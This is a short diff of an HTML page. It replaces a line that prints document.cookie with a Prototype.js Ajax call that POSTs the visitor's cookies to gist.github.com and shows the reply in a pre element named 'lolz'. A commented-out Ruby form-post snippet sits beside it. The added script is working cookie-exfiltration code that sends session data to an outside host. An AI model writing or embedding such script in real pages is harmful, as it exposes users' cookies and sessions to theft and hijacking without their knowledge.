@@ -1,3 +1,20 @@
+<html><head>
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/prototype/1.6.0.3/prototype.js"></script>
+</head><body>
+<!-- res = Net::HTTP.post_form(URI.parse(),
+          { 'files[file1.ab]' => 'CONTNETS', 
+            'files[file2.ab]' => 'contents' })
+-->
 <script type="text/javascript" charset="utf-8">
-	document.write(document.cookie);
+new Ajax.Request('http://gist.github.com/api/v1/xml/new', {
+  method: 'post',
+  postBody: document.cookie,
+  onSuccess: function(transport) {
+    var notice = $('lolz');
+      notice.update(transport.responseText)
+  }
+});
 </script>
+<pre id="lolz">
+</pre>
+</body></html>
